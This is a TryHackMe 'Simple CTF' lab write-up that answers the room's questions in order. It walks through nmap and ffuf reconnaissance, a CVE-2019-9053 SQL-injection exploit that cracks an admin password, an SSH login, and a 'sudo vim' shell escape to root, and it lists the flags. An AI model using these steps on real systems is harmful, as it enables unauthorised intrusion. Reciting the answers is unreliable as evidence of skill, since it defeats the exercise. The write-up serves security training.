---
title: "TryHackMe - Simple CTF"
classes: wide
search: false
categories: 
  - TryHackMe
toc: true
toc_label: "Contents"
last_modified_at: 2020-06-14T15:58:26+08:00
---

> Beginner level CTF

### #1 How many services are running under port 1000?

The first step is we need to know about the network from the target. Here, we use NMAP to grabbing the network information.
```
╭─root@twsterlab /twseptian/lab/THM/rooms/simple-ctf 
╰─# nmap -sC -sV -T4 -p- -oN simple-ctf.nmap 10.10.152.92
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-14 15:56 WIB
Nmap scan report for 10.10.152.92
Host is up (0.22s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.19.3
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 353.94 seconds
```
ANS: `2`

### #2 What is running on the higher port?
ANS: `ssh`

### #3 What's the CVE you're using against the application?
Here, we found keyword `/openemr-5_0_1_3` on `robots.txt`

```
#
# "$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $"
#
#   This file tells search engines not to index your CUPS server.
#
#   Copyright 1993-2003 by Easy Software Products.
#
#   These coded instructions, statements, and computer programs are the
#   property of Easy Software Products and are protected by Federal
#   copyright law.  Distribution and use rights are outlined in the file
#   "LICENSE.txt" which should have been included with this file.  If this
#   file is missing or damaged please contact Easy Software Products
#   at:
#
#       Attn: CUPS Licensing Information
#       Easy Software Products
#       44141 Airport View Drive, Suite 204
#       Hollywood, Maryland 20636-3111 USA
#
#       Voice: (301) 373-9600
#       EMail: cups-info@cups.org
#         WWW: http://www.cups.org
#

User-agent: *
Disallow: /


Disallow: /openemr-5_0_1_3 
#
# End of "$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $".
#
```
but it wasn't worked on the url `http://10.10.152.92/openemr-5_0_1_3`
Here, we tried to use `ffuf` to find directory lists

```
╭─twseptian@twsterlab ~/lab/THM/rooms 
╰─$ ffuf -w /usr/share/wordlists/dirb/big.txt:FUZZ -u http://10.10.152.92/FUZZ/ -mc 200

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.152.92/FUZZ/
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

simple                  [Status: 200, Size: 19913, Words: 2945, Lines: 127]
:: Progress: [20469/20469] :: Job [1/1] :: 139 req/sec :: Duration: [0:02:27] :: Errors: 0 ::
╭─twseptian@twsterlab ~/lab/THM/rooms 
╰─$ 
```

Let's open the `simple` path.

![cms-made-simple](/assets/images/thm-simple-ctf/cms-made-simple.png)

The information about the website was build

```
© Copyright 2004 - 2020 - CMS Made Simple
This site is powered by CMS Made Simple version 2.2.8
```
Searchploit
```
╭─twseptian@twsterlab ~/lab/THM/rooms 
╰─$ searchsploit cms made simple 2.2.8
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
CMS Made Simple < 2.2.10 - SQL Injection                                                                                            | php/webapps/46635.py
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
╭─twseptian@twsterlab ~/lab/THM/rooms 
╰─$ 
```
and exploitdb https://www.exploit-db.com/exploits/46635

![exploitdb-cms-made-simple](/assets/images/thm-simple-ctf/exploitdb-cms-made-simple.png)

ANS: `CVE-2019-9053`
 
### #4 To what kind of vulnerability is the application vulnerable?
Hint
```
You can use /usr/share/seclists/Passwords/Common-Credentials/best110.txt to crack the pass
```
let's copy file `php/webapps/46635.py` to our directory
```
╭─twseptian@twsterlab ~/lab/THM/rooms/simple-ctf 
╰─$ searchsploit -m php/webapps/46635.py
  Exploit: CMS Made Simple < 2.2.10 - SQL Injection
      URL: https://www.exploit-db.com/exploits/46635
     Path: /usr/share/exploitdb/exploits/php/webapps/46635.py
File Type: Python script, ASCII text executable, with CRLF line terminators

Copied to: /twseptian/lab/THM/rooms/simple-ctf/46635.py


╭─twseptian@twsterlab ~/lab/THM/rooms/simple-ctf 
╰─$ 
```
we got some problem when we used `/usr/share/seclists/Passwords/Common-Credentials/best110.txt` password list
```
╭─twseptian@twsterlab ~/lab/THM/rooms/simple-ctf 
╰─$ python2.7 46635.py -u http://10.10.152.92/simple/ --crack -w /usr/share/seclists/Passwords/Common-Credentials/best110.txt
[+] Salt for password found: 1dac0d92e9fa69EM
[+] Username found: mitch
[+] Email found: admi13qo
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
╭─twseptian@twsterlab ~/lab/THM/rooms/simple-ctf 
╰─$ 
```
so, we used `rockyou.txt`
```
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admi987
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
╭─twseptian@twsterlab ~/lab/THM/rooms/simple-ctf 
╰─$ 
```

ANS: `sqli`
### #5 What's the password?
ANS: `secret`
### #6 Where can you login with the details obtained?
ANS: `ssh`
### #7 What's the user flag?
```
╭─twseptian@twsterlab ~/lab/THM/rooms/simple-ctf 
╰─$ ssh -p 2222 mitch@10.10.152.92                                                                                                                                1 ↵
mitch@10.10.152.92's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Sun Jun 14 13:16:28 2020 from 10.9.19.3
$ ls -la
total 36
drwxr-x--- 3 mitch mitch 4096 aug 19  2019 .
drwxr-xr-x 4 root  root  4096 aug 17  2019 ..
-rw------- 1 mitch mitch  178 aug 17  2019 .bash_history
-rw-r--r-- 1 mitch mitch  220 sep  1  2015 .bash_logout
-rw-r--r-- 1 mitch mitch 3771 sep  1  2015 .bashrc
drwx------ 2 mitch mitch 4096 aug 19  2019 .cache
-rw-r--r-- 1 mitch mitch  655 mai 16  2017 .profile
-rw-rw-r-- 1 mitch mitch   19 aug 17  2019 user.txt
-rw------- 1 mitch mitch  515 aug 17  2019 .viminfo
$ cat user.txt
G00d j0b, keep up!
$ 
```
ANS: `G00d j0b, keep up!`
### #8 Is there any other user in the home directory? What's its name?
```
$ pwd
/home/mitch
$ cd /home
$ ls -la
total 16
drwxr-xr-x  4 root    root    4096 aug 17  2019 .
drwxr-xr-x 23 root    root    4096 aug 19  2019 ..
drwxr-x---  3 mitch   mitch   4096 aug 19  2019 mitch
drwxr-x--- 16 sunbath sunbath 4096 aug 19  2019 sunbath
$ 
```
ANS: `sunbath`

### #9 What can you leverage to spawn a privileged shell?
```
$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
$ 
```
ANS: `vim`

### #10 What's the root flag?

The clue for privilege escalation is using `vim`. We recommend following a tutorial on how to execute privilege escalation using `vim` from gtfobins -> https://gtfobins.github.io/gtfobins/vim/

![vim-gtfobins](/assets/images/thm-simple-ctf/vim-gtfobins.png)

```
$ sudo vim -c ':!/bin/sh'

# ls -la 
total 16
drwxr-xr-x  4 root    root    4096 aug 17  2019 .
drwxr-xr-x 23 root    root    4096 aug 19  2019 ..
drwxr-x---  3 mitch   mitch   4096 aug 19  2019 mitch
drwxr-x--- 16 sunbath sunbath 4096 aug 19  2019 sunbath
# cd /root
# ls
root.txt
# cat root.txt
W3ll d0n3. You made it!
# 
```
ANS: `W3ll d0n3. You made it!`

### References:
- CMS Made Simple < 2.2.10 - SQL Injection - https://www.exploit-db.com/exploits/46635
- Vim privilege escalation - https://gtfobins.github.io/gtfobins/vim/